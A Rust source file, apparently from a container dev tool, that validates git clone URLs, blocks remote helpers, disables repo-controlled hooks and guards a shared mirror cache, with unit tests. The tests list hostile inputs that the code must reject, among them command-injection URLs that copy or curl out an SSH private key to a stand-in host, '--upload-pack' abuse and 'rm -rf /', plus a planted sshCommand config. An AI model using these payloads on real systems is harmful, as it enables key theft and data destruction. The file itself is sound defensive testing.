use bollard::models::MountType;
use bollard::service::Mount;
use colored::Colorize;
use gix_config::File;
use lazy_static::lazy_static;
use regex::Regex;
use sha2::{Digest, Sha256};

use crate::{
    api::{GitApi, config::ConfigBody, container},
    config::config::FileFormat,
    constants,
    model::{
        types::{AnyError, ContainerResult, RunMode, RunSpec},
        volume::{RoozVolume, VolumeFile},
    },
};

use super::{id, labels::Labels, sh, ssh};

lazy_static! {
    // Either scheme://[user@]host[:port]/path or the scp-like [user@]host:path.
    static ref GIT_URL: Regex = Regex::new(
        r"^(?:[a-zA-Z][a-zA-Z0-9+.\-]*://\S+|[A-Za-z0-9._\-]+(?:@[A-Za-z0-9._\-]+)?:\S+)$"
    )
    .unwrap();

    // 'name::address' hands the clone to a remote helper - 'ext::' runs an arbitrary
    // command - and the scp-like form above would otherwise accept it.
    static ref REMOTE_HELPER: Regex = Regex::new(r"^[A-Za-z][A-Za-z0-9+.\-]*::").unwrap();
}

pub const REQUIRE_SECURE_TRANSPORT_ENV: &str = "ROOZ_REQUIRE_SECURE_TRANSPORT";

#[derive(Debug, PartialEq, Eq, Clone, Copy)]
enum Transport {
    // the server is authenticated and the stream is integrity-protected
    Secure,
    // neither: whoever sits on the network path decides what the clone contains
    Cleartext,
    // a local path - no network to attack, but nothing authenticates it either
    Local,
}

// Only the transports git users actually clone over are accepted; everything else
// (remote helpers, ftp, invented schemes) is refused rather than handed to git.
fn transport(url: &str) -> Result<Transport, AnyError> {
    if REMOTE_HELPER.is_match(url) {
        return Err(format!(
            "refusing '{}': 'name::address' remote helpers are not a supported clone transport",
            url
        )
        .into());
    }
    let scheme = match url.split_once("://") {
        Some((scheme, _)) => scheme.to_ascii_lowercase(),
        // the scp-like 'user@host:path' form is git over ssh
        None => return Ok(Transport::Secure),
    };
    match scheme.as_str() {
        "https" | "ssh" | "git+ssh" | "ssh+git" => Ok(Transport::Secure),
        "http" | "git" => Ok(Transport::Cleartext),
        "file" => Ok(Transport::Local),
        other => Err(format!(
            "refusing '{}': '{}' is not a supported clone transport (use https, ssh, http, git or file)",
            url, other
        )
        .into()),
    }
}

// A cleartext clone authenticates nothing: an on-path attacker substitutes the repository
// content. Warned about by default so local http:// remotes keep working; refused outright
// when the operator asks. Remote '--config' sources are ssh-only, so this never covers them.
fn check_transport(url: &str, require_secure: bool) -> Result<Option<String>, AnyError> {
    match transport(url)? {
        Transport::Cleartext if require_secure => Err(format!(
            "refusing to clone '{}' over a cleartext transport ({}=true). Use https:// or ssh://.",
            url, REQUIRE_SECURE_TRANSPORT_ENV
        )
        .into()),
        Transport::Cleartext => Ok(Some(format!(
            "WARNING: cloning '{}' over a cleartext transport. Nothing authenticates the server \
             or protects the content, so anyone on the network path can substitute the repository. \
             Prefer https:// or ssh://, \
             or set {}=true to refuse cleartext clones.",
            url, REQUIRE_SECURE_TRANSPORT_ENV
        ))),
        Transport::Secure | Transport::Local => Ok(None),
    }
}

fn require_secure_transport() -> bool {
    std::env::var(REQUIRE_SECURE_TRANSPORT_ENV)
        .map(|v| v.trim().eq_ignore_ascii_case("true"))
        .unwrap_or(false)
}

// Clone URLs reach a shell (quoted) and git's argv, so both layers need guarding:
// whitespace and control characters cannot appear in a real URL, and a leading
// dash would make git parse the URL as an option.
pub fn validate_clone_url(url: &str) -> Result<(), AnyError> {
    if url.is_empty() {
        return Err("git URL must not be empty".into());
    }
    if url.starts_with('-') {
        return Err(format!("git URL must not start with '-': '{}'", url).into());
    }
    if url.chars().any(|c| c.is_whitespace() || c.is_control()) {
        return Err(format!(
            "git URL must not contain whitespace or control characters: '{}'",
            url
        )
        .into());
    }
    if !GIT_URL.is_match(url) {
        return Err(format!(
            "not a well-formed git URL: '{}' (expected scheme://host/path or user@host:path)",
            url
        )
        .into());
    }
    if let Some(warning) = check_transport(url, require_secure_transport())? {
        eprintln!("{}", warning.yellow());
    }
    Ok(())
}

#[derive(Clone, Debug)]
pub enum CloneUrls {
    Root { url: String },
    Extra { urls: Vec<String> },
}

#[derive(Clone, Debug)]
pub struct CloneEnv {
    pub image: String,
    pub uid: String,
    pub workspace_key: String,
    pub working_dir: String,
    pub depth_override: Option<i64>,
    // When set, the clone lands on a throw-away tmpfs instead of the workspace's work
    // volume, so git never touches a repository the workspace itself can write.
    pub isolated: bool,
}

impl Default for CloneEnv {
    fn default() -> Self {
        Self {
            image: constants::DEFAULT_IMAGE.to_string(),
            uid: constants::DEFAULT_UID.to_string(),
            workspace_key: Default::default(),
            working_dir: constants::WORK_DIR.to_string(),
            depth_override: None,
            isolated: false,
        }
    }
}

#[derive(Clone, Debug)]
pub struct RootRepoCloneResult {
    pub dir: String,
}

fn get_clone_dir(
    root_dir: &str,
    git_ssh_url: &str,
    git_config: &Option<String>,
) -> Result<String, AnyError> {
    let mut git_url = git_ssh_url.to_string();
    log::debug!("Original URL: {}", git_url);
    if let Some(git_config) = git_config {
        let config = File::try_from(git_config.as_str())?;
        let rewrite = config
            .sections_by_name("url")
            .into_iter()
            .flatten()
            .filter_map(|s| {
                let base = s.header().subsection_name()?.to_string();
                Some(
                    s.body()
                        .values("insteadOf")
                        .into_iter()
                        .map(|alias| (alias.to_string(), base.clone()))
                        .collect::<Vec<_>>(),
                )
            })
            .flatten()
            .filter(|(alias, _)| !alias.is_empty() && git_ssh_url.starts_with(alias.as_str()))
            .max_by_key(|(alias, _)| alias.len());
        if let Some((alias, base)) = rewrite {
            git_url = format!("{}{}", base, &git_ssh_url[alias.len()..]);
            log::debug!("Expanded URL: {}", git_url);
        }
    }

    let clone_work_dir = git_url
        .rsplit(['/', ':'])
        .next()
        .unwrap_or("repo")
        .to_string();
    let clone_work_dir = clone_work_dir
        .strip_suffix(".git")
        .unwrap_or(&clone_work_dir)
        .to_string();

    if clone_work_dir.is_empty() || clone_work_dir == "." || clone_work_dir == ".." {
        return Err(format!(
            "could not derive a clone directory from URL: '{}'",
            git_ssh_url
        )
        .into());
    }

    log::debug!("Clone dir: {}", clone_work_dir);

    let work_dir = format!("{}/{}", root_dir, clone_work_dir.clone());

    log::debug!("Full clone dir: {:?}", work_dir);
    Ok(work_dir)
}

// A repository decides what git executes on its behalf: hooks, core.fsmonitor, the pager.
// rooz's own git runs are non-interactive and want none of that, so they switch it off.
const NO_REPO_EXEC: &str = "-c core.hooksPath=/dev/null -c core.fsmonitor=false -c core.pager=cat";

// Where the git containers keep a bare mirror of each repository they clone, in a cache volume.
// Only those containers mount it, but another user of the engine can write it, so a mirror is
// never trusted to run anything: a clone borrows its objects, and a finished clone feeds them
// back through a local fetch. Git never talks to a remote from inside a mirror (where the ssh key
// is at hand) and never looks at a mirror someone else owns.
const GIT_CACHE_DIR: &str = "/tmp/rooz-git-cache";

// Whatever a mirror's own config says, a fetch into it is a plain local one.
const LOCAL_ONLY: &str = "-c protocol.allow=never -c protocol.file.allow=always";

fn mirror_dir(root: &str, url: &str) -> String {
    let mut hasher = Sha256::new();
    hasher.update(url);
    format!("{}/{}.git", root, &format!("{:x}", hasher.finalize())[..16])
}

// The mirrors sit in a volume every workspace of the operator shares, and a 'file://' URL names
// what is in it. A local path can come from a config rooz does not trust, so it keeps that volume
// out of the container.
fn cacheable(urls: &[String]) -> bool {
    urls.iter()
        .all(|u| !matches!(transport(u), Ok(Transport::Local)))
}

// `--` stops git from parsing a URL as an option; the shell quoting keeps the
// whole value a single argument. With `cache`, the clone borrows the objects of the repository's
// mirror (when it is ours) and drops the link, then the finished clone refreshes the mirror. A
// mirror that cannot be used or updated only costs the speed-up.
fn clone_line(clone_dir: &str, depth: &str, url: &str, cache: bool) -> String {
    clone_line_with(GIT_CACHE_DIR, clone_dir, depth, url, cache)
}

fn clone_line_with(
    cache_root: &str,
    clone_dir: &str,
    depth: &str,
    url: &str,
    cache: bool,
) -> String {
    let dir = sh::quote(clone_dir);
    let clone = format!(
        "git {} -c include.path=/tmp/rooz/.gitconfig clone $REF {} -- {}",
        NO_REPO_EXEC,
        depth,
        sh::quote(url)
    );
    if !cache {
        return format!(
            "ls {dir}/.git > /dev/null 2>&1 || {{\nREF=\n{clone}\n}}\n",
            dir = dir,
            clone = clone
        );
    }
    let mirror = sh::quote(&mirror_dir(cache_root, url));
    // `-O` follows a symlink, so a link someone left at the mirror path is refused too
    let ours = r#"[ -O "$M" ] && [ ! -L "$M" ]"#;
    format!(
        "ls {dir}/.git > /dev/null 2>&1 || {{\n\
         M={mirror}\n\
         REF=; if [ -f \"$M/HEAD\" ] && {ours}; then REF=\"--reference-if-able $M --dissociate\"; fi\n\
         if {clone}; then\n\
         [ -d \"$M\" ] || git {opts} init -q --bare \"$M\" 2>/dev/null || true\n\
         if {ours}; then git {opts} {local} --git-dir=\"$M\" fetch -q --no-tags -- {dir} '+refs/remotes/origin/*:refs/heads/*' '+refs/tags/*:refs/tags/*' || true; fi\n\
         else false; fi\n\
         }}\n",
        dir = dir,
        mirror = mirror,
        ours = ours,
        clone = clone,
        opts = NO_REPO_EXEC,
        local = LOCAL_ONLY
    )
}

// Scratch space for clones rooz reads itself: container-local, dropped with the container,
// and unreachable from the workspace.
fn scratch_mount(target: &str) -> Mount {
    Mount {
        typ: Some(MountType::TMPFS),
        target: Some(target.into()),
        ..Default::default()
    }
}

impl<'a> GitApi<'a> {
    async fn clone_from_spec(&self, spec: &CloneEnv, urls: &CloneUrls) -> Result<String, AnyError> {
        self.api.volume.require_ssh_key().await?;
        let mut clone_script = ssh::ensure_config_script("/tmp/.ssh");
        let all_urls: Vec<String> = match &urls {
            CloneUrls::Root { url } => vec![url.to_string()],
            CloneUrls::Extra { urls } => {
                urls.iter().map(|x| x.to_string()).collect::<Vec<String>>()
            }
        };

        let depth = if let Some(depth) = spec.depth_override {
            format!("--depth={}", depth)
        } else {
            "".to_string()
        };

        let gitconfig = self.api.get_system_config().await?.gitconfig;

        // a shallow clone has no use for a mirror, and a config clone shares nothing
        let cache = depth.is_empty() && !spec.isolated && cacheable(&all_urls);

        for url in all_urls {
            validate_clone_url(&url)?;
            let clone_dir = get_clone_dir(&spec.working_dir, &url, &gitconfig)?;
            clone_script.push_str(&clone_line(&clone_dir, &depth, &url, cache));
        }

        let clone_cmd = container::inject(&clone_script, "clone.sh");
        // IMPORTANT: no workspace label here as those do not really belong to workspace
        // it will get refactored to use one shot
        let labels = Labels::from(&[Labels::role("git")]);
        let mut mounts = vec![ssh::mount("/tmp/.ssh", false)];

        let mut volumes: Vec<RoozVolume> = vec![];

        if let Some(gitconfig) = &gitconfig {
            let git_config_vol =
                RoozVolume::config_data(&spec.workspace_key, "/tmp/rooz/", None, None);
            self.api
                .volume
                .write_files(
                    &git_config_vol,
                    &[VolumeFile::new(".gitconfig", gitconfig)],
                    Some(spec.uid.parse::<i32>()?),
                )
                .await?;
            volumes.push(git_config_vol);
        }

        if spec.isolated {
            mounts.push(scratch_mount(&spec.working_dir));
        } else {
            volumes.push(RoozVolume::work(&spec.workspace_key, &spec.working_dir));
        }
        if cache {
            volumes.push(RoozVolume::cache(GIT_CACHE_DIR));
        }

        self.api.volume.ensure_mounts(&volumes, None).await?;

        for vol in &volumes {
            mounts.push(vol.to_mount(None));
        }

        let run_spec = RunSpec {
            reason: "git-clone",
            image: &spec.image,
            uid: &spec.uid,
            work_dir: Some(&spec.working_dir),
            container_name: &id::random_suffix("rooz-git"),
            workspace_key: &spec.workspace_key,
            mounts: Some(mounts),
            command: constants::default_command(),
            privileged: false,
            force_recreate: false,
            run_mode: RunMode::Git,
            labels,
            ..Default::default()
        };

        if let ContainerResult::Created { id } = self.api.container.create(run_spec).await? {
            self.api.container.start(&id).await?;
            self.api.exec.ensure_user(&id).await?;
            self.api
                .exec
                .chown(&id, &spec.uid.parse::<i32>()?, &spec.working_dir)
                .await?;
            if cache {
                self.api
                    .exec
                    .chown_dir(&id, &spec.uid.parse::<i32>()?, GIT_CACHE_DIR)
                    .await?;
            }

            self.api
                .exec
                .tty(
                    "git-clone",
                    &id,
                    None,
                    None,
                    Some(clone_cmd.iter().map(String::as_str).collect()),
                )
                .await?;
            Ok(id.to_string())
        } else {
            unreachable!("Random suffix gets generated each time")
        }
    }

    pub async fn clone_root_repo(
        &self,
        url: &str,
        spec: &CloneEnv,
    ) -> Result<RootRepoCloneResult, AnyError> {
        let container_id = self
            .clone_from_spec(spec, &CloneUrls::Root { url: url.into() })
            .await?;
        let clone_dir = get_clone_dir(
            &spec.working_dir,
            url,
            &self.api.get_system_config().await?.gitconfig,
        )?;
        self.api.container.kill(&container_id, false).await?;

        Ok(RootRepoCloneResult { dir: clone_dir })
    }

    pub async fn clone_extra_repos(
        &self,
        spec: CloneEnv,
        urls: Vec<String>,
    ) -> Result<(), AnyError> {
        let container_id = self
            .clone_from_spec(&spec, &CloneUrls::Extra { urls })
            .await?;
        self.api.container.kill(&container_id, false).await?;
        Ok(())
    }

    pub async fn clone_config_repo(
        &self,
        spec: CloneEnv,
        url: &str,
        path: &str,
    ) -> Result<(Option<ConfigBody>, String), AnyError> {
        // Configuration is read from a clone that shares nothing with the workspace. Re-using
        // (or pulling) a checkout in the work volume would let workspace-planted git hooks and
        // repo config run in this container - which mounts the operator's ssh key volume.
        let spec = CloneEnv {
            depth_override: Some(1),
            working_dir: constants::CONFIG_CLONE_DIR.to_string(),
            isolated: true,
            ..spec
        };
        let container_id = self
            .clone_from_spec(
                &spec,
                &CloneUrls::Extra {
                    urls: vec![url.into()],
                },
            )
            .await?;
        let clone_dir = get_clone_dir(
            &spec.working_dir,
            url,
            &self.api.get_system_config().await?.gitconfig,
        )?;
        let file_format = FileFormat::from_path(path)?;
        let result = self
            .config
            .read_config_body(&container_id, &clone_dir, file_format, path)
            .await?;
        self.api.container.kill(&container_id, false).await?;
        Ok((result, clone_dir))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn well_formed_urls_pass() {
        for url in [
            "https://github.com/queil/rooz.git",
            "http://gitea.local:3000/a/b.git",
            "ssh://git@github.com:22/queil/rooz.git",
            "git@github.com:queil/rooz.git",
            "file:///srv/repos/rooz.git",
        ] {
            assert!(validate_clone_url(url).is_ok(), "rejected: {}", url);
        }
    }

    #[test]
    fn cleartext_transports_warn_and_can_be_refused() {
        for url in ["http://gitea.local:3000/a/b.git", "git://h/repo"] {
            let warning = check_transport(url, false).unwrap();
            assert!(
                warning.is_some_and(|w| w.contains(url)),
                "no cleartext warning for: {}",
                url
            );
            assert!(check_transport(url, true).is_err(), "not refused: {}", url);
        }
    }

    #[test]
    fn authenticated_transports_are_silent() {
        for url in [
            "https://github.com/queil/rooz.git",
            "ssh://git@github.com:22/queil/rooz.git",
            "git@github.com:queil/rooz.git",
            "file:///srv/repos/rooz.git",
        ] {
            assert_eq!(check_transport(url, true).unwrap(), None, "warned: {}", url);
        }
    }

    #[test]
    fn unsupported_transports_are_rejected() {
        // 'ext::' hands git a command to run, and the scp-like form would otherwise take it
        for url in [
            "ext::sh",
            "ext::https://h/repo",
            "ftp://evil/x.git",
            "made-up://h/repo",
        ] {
            assert!(validate_clone_url(url).is_err(), "accepted: {}", url);
        }
    }

    #[test]
    fn injection_payloads_are_rejected() {
        for url in [
            "",
            "https://attacker.invalid/repo; cat /tmp/.ssh/id_ed25519 > /tmp/pwned",
            "https://x.git && cat /tmp/.ssh/id_ed25519 > /tmp/pwned",
            "https://attacker.invalid/x'; curl http://evil/ -d @/tmp/.ssh/id_ed25519 #",
            "--upload-pack=touch /tmp/pwned",
            "https://x.git\nrm -rf /",
            "not a url",
        ] {
            assert!(validate_clone_url(url).is_err(), "accepted: {:?}", url);
        }
    }

    #[test]
    fn clone_line_quotes_url_and_dir() {
        for cache in [false, true] {
            let line = clone_line("/work/re'po", "--depth=1", "https://h/a'b.git", cache);
            assert!(line.contains(r"ls '/work/re'\''po'/.git"), "{}", line);
            assert!(line.contains("-- 'https://h/a'\\''b.git'"), "{}", line);
        }
    }

    #[test]
    fn a_mirror_is_never_trusted_to_run_or_fetch_anything() {
        // the volume is writable by any user of the engine
        let line = clone_line("/work/repo", "", "git@h:a/b.git", true);
        assert!(!line.contains("safe.directory"), "{}", line);
        assert!(!line.contains("remote update"), "{}", line);
        assert!(!line.contains("--mirror"), "{}", line);
        // the only git run on a mirror is a local fetch from the clone, whatever the mirror's
        // config rewrites its URLs to
        let on_mirror: Vec<&str> = line.lines().filter(|l| l.contains("--git-dir")).collect();
        assert_eq!(on_mirror.len(), 1, "{}", line);
        for flag in [
            "-c protocol.allow=never",
            "-c protocol.file.allow=always",
            "-c core.hooksPath=/dev/null",
        ] {
            assert!(on_mirror[0].contains(flag), "missing {}: {}", flag, line);
        }
        // a mirror owned by someone else is neither read nor written
        assert_eq!(line.matches(r#"[ -O "$M" ]"#).count(), 2, "{}", line);
        assert_eq!(line.matches(r#"[ ! -L "$M" ]"#).count(), 2, "{}", line);
    }

    #[test]
    fn a_local_url_keeps_the_shared_mirror_volume_out_of_the_clone() {
        let urls = |u: &[&str]| u.iter().map(|s| s.to_string()).collect::<Vec<_>>();
        assert!(cacheable(&urls(&["git@h:a/b.git", "https://h/a.git"])));
        assert!(!cacheable(&urls(&["file:///tmp/rooz-git-cache/ab.git"])));
        assert!(!cacheable(&urls(&["git@h:a/b.git", "file:///x"])));
    }

    #[test]
    fn clone_line_disables_repo_controlled_execution() {
        let line = clone_line("/work/repo", "", "https://h/a.git", true);
        for flag in [
            "-c core.hooksPath=/dev/null",
            "-c core.fsmonitor=false",
            "-c core.pager=cat",
        ] {
            assert!(line.contains(flag), "missing {}: {}", flag, line);
        }
    }

    #[test]
    fn config_clones_never_land_in_the_work_volume() {
        // the work volume is workspace-writable; a config clone rooz reads itself must not
        // share it (see clone_config_repo)
        let dir = get_clone_dir(constants::CONFIG_CLONE_DIR, "https://h/cfg.git", &None).unwrap();
        assert_eq!(dir, "/tmp/rooz-config/cfg");
        assert!(!dir.starts_with(constants::WORK_DIR));
    }

    #[test]
    fn scratch_mount_is_container_local() {
        let m = scratch_mount(constants::CONFIG_CLONE_DIR);
        assert_eq!(m.typ, Some(MountType::TMPFS));
        assert_eq!(m.target.as_deref(), Some(constants::CONFIG_CLONE_DIR));
        assert_eq!(m.source, None);
    }

    #[test]
    fn hostile_url_stays_one_argument_in_a_real_shell() {
        // the payload shape from the report: the injected command must not run,
        // and the URL must reach git as a single (bogus) argument
        let dir = std::env::temp_dir().join("rooz-clone-injection-test");
        let _ = std::fs::remove_file(&dir);
        let hostile = format!("x'; touch {}; #", dir.display());
        for cache in [false, true] {
            let line =
                clone_line_with("/tmp/rooz-no-such-cache", "/work/repo", "", &hostile, cache);
            // git only echoes its arguments, so nothing but the shell parsing is under test
            let out = std::process::Command::new("sh")
                .arg("-c")
                .arg(format!("git() {{ printf '%s\\n' \"$@\"; }}\n{}", line))
                .output()
                .unwrap();
            let stdout = String::from_utf8(out.stdout).unwrap();
            assert!(!dir.exists(), "injected command executed");
            assert!(
                stdout.lines().any(|l| l == hostile),
                "url did not survive as one argument: {}",
                stdout
            );
        }
    }

    #[test]
    fn clone_dir_only_drops_a_trailing_git_suffix() {
        for (url, dir) in [
            ("https://h/u/my.github.io", "/w/my.github.io"),
            ("https://h/u/foo.gitops.git", "/w/foo.gitops"),
            ("git@h:repo.git", "/w/repo"),
            ("git@h:u/repo.git", "/w/repo"),
        ] {
            assert_eq!(get_clone_dir("/w", url, &None).unwrap(), dir, "{}", url);
        }
    }

    #[test]
    fn insteadof_prefers_the_longest_alias_and_reads_every_value() {
        let cfg = Some(
            "[url \"https://a/\"]\n\tinsteadOf = x:\n\tinsteadOf = y:\n[url \"https://b/\"]\n\tinsteadOf = x:long/\n"
                .to_string(),
        );
        assert_eq!(get_clone_dir("/w", "y:r.git", &cfg).unwrap(), "/w/r");
        assert_eq!(get_clone_dir("/w", "x:long/r.git", &cfg).unwrap(), "/w/r");
    }

    #[test]
    fn clone_dir_derivation_rejects_dot_segments() {
        assert!(get_clone_dir("/work", "https://h/a/..", &None).is_err());
        assert!(get_clone_dir("/work", "https://h/a/", &None).is_err());
        assert_eq!(
            get_clone_dir("/work", "https://h/rooz.git", &None).unwrap(),
            "/work/rooz"
        );
    }

    fn git(dir: &std::path::Path, args: &[&str]) -> String {
        let out = std::process::Command::new("git")
            .args(["-c", "protocol.file.allow=always"])
            .args(args)
            .current_dir(dir)
            .output()
            .expect("run git");
        assert!(
            out.status.success(),
            "git {:?}: {}",
            args,
            String::from_utf8_lossy(&out.stderr)
        );
        String::from_utf8_lossy(&out.stdout).to_string()
    }

    // runs the generated script for real against a local repository, from the work dir as the
    // git container does: the clone lands in `work/<name from the url>`
    fn run_clone(cache_root: &std::path::Path, work: &std::path::Path, url: &str, cache: bool) {
        std::fs::create_dir_all(work).unwrap();
        let line = clone_line_with(
            cache_root.to_str().unwrap(),
            work.join("origin").to_str().unwrap(),
            "",
            url,
            cache,
        );
        let out = std::process::Command::new("sh")
            .current_dir(work)
            .arg("-c")
            .arg(format!(
                "git() {{ command git -c protocol.file.allow=always \"$@\"; }}\n{}",
                line
            ))
            .output()
            .expect("run script");
        assert!(
            out.status.success(),
            "{}\n{}",
            line,
            String::from_utf8_lossy(&out.stderr)
        );
    }

    #[test]
    fn a_cached_clone_is_complete_and_independent_of_its_mirror() {
        if std::process::Command::new("git")
            .arg("--version")
            .output()
            .is_err()
        {
            return;
        }
        let tmp = std::env::temp_dir().join(format!("rooz-git-test-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        let (origin, cache, a, b) = (
            tmp.join("origin"),
            tmp.join("cache"),
            tmp.join("a"),
            tmp.join("b"),
        );
        std::fs::create_dir_all(&origin).unwrap();
        std::fs::create_dir_all(&cache).unwrap();
        git(&origin, &["init", "-q", "-b", "main"]);
        std::fs::write(origin.join("f"), "one").unwrap();
        git(&origin, &["add", "f"]);
        git(
            &origin,
            &[
                "-c",
                "user.name=t",
                "-c",
                "user.email=t@t",
                "commit",
                "-qm",
                "one",
            ],
        );
        let url = format!("file://{}", origin.display());

        run_clone(&cache, &a, &url, true);
        assert_eq!(std::fs::read_to_string(a.join("origin/f")).unwrap(), "one");
        let mirror = mirror_dir(cache.to_str().unwrap(), &url);
        assert!(std::path::Path::new(&mirror).join("HEAD").exists());
        // no link left to the mirror, and the remote is the real one
        assert!(!a.join("origin/.git/objects/info/alternates").exists());
        assert_eq!(
            git(&a.join("origin"), &["remote", "get-url", "origin"]).trim(),
            url
        );

        // the mirror holds the history, and its own config decides nothing: the keys that would
        // run a command or redirect a fetch are in it, and neither happens
        assert_eq!(
            git(
                std::path::Path::new(&mirror),
                &["rev-list", "--count", "refs/heads/main"]
            )
            .trim(),
            "1"
        );
        let planted = tmp.join("planted");
        let mut config = std::fs::read_to_string(format!("{}/config", mirror)).unwrap();
        config.push_str(&format!(
            "[core]\n\tsshCommand = touch {p}\n\tgitProxy = touch {p}\n[url \"ssh://evil.invalid/\"]\n\tinsteadOf = {a}\n",
            p = planted.display(),
            a = tmp.display()
        ));
        std::fs::write(format!("{}/config", mirror), config).unwrap();

        // a new commit reaches the next clone through the updated mirror
        std::fs::write(origin.join("f"), "two").unwrap();
        git(
            &origin,
            &[
                "-c",
                "user.name=t",
                "-c",
                "user.email=t@t",
                "commit",
                "-qam",
                "two",
            ],
        );
        run_clone(&cache, &b, &url, true);
        assert_eq!(std::fs::read_to_string(b.join("origin/f")).unwrap(), "two");
        assert_eq!(
            git(&b.join("origin"), &["rev-list", "--count", "HEAD"]).trim(),
            "2"
        );

        assert!(!planted.exists(), "a command from the mirror's config ran");

        // the mirror going away leaves the clones whole
        std::fs::remove_dir_all(&cache).unwrap();
        assert_eq!(
            git(&a.join("origin"), &["rev-list", "--count", "HEAD"]).trim(),
            "1"
        );
        git(&b.join("origin"), &["fsck", "--no-progress"]);
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn a_symlink_at_the_mirror_path_is_neither_read_nor_written() {
        if std::process::Command::new("git")
            .arg("--version")
            .output()
            .is_err()
        {
            return;
        }
        let tmp = std::env::temp_dir().join(format!("rooz-git-link-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        let (origin, cache, work, elsewhere) = (
            tmp.join("origin"),
            tmp.join("cache"),
            tmp.join("w"),
            tmp.join("elsewhere.git"),
        );
        for d in [&origin, &cache, &elsewhere] {
            std::fs::create_dir_all(d).unwrap();
        }
        git(&origin, &["init", "-q", "-b", "main"]);
        std::fs::write(origin.join("f"), "one").unwrap();
        git(&origin, &["add", "f"]);
        git(
            &origin,
            &[
                "-c",
                "user.name=t",
                "-c",
                "user.email=t@t",
                "commit",
                "-qm",
                "one",
            ],
        );
        git(&elsewhere, &["init", "-q", "--bare"]);
        let url = format!("file://{}", origin.display());
        // a link to a repository the cloning user owns passes `-O` on its own
        std::os::unix::fs::symlink(&elsewhere, mirror_dir(cache.to_str().unwrap(), &url)).unwrap();

        run_clone(&cache, &work, &url, true);
        assert_eq!(
            std::fs::read_to_string(work.join("origin/f")).unwrap(),
            "one"
        );
        assert!(
            !elsewhere.join("refs/heads/main").exists(),
            "the clone was fed into the linked repository"
        );
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn an_uncached_clone_goes_straight_to_the_remote() {
        let line = clone_line_with("/c", "/work/r", "", "https://h/a.git", false);
        assert!(
            !line.contains("--mirror") && !line.contains("--reference"),
            "{}",
            line
        );
        assert!(!line.contains("blob:none"), "{}", line);
    }
}
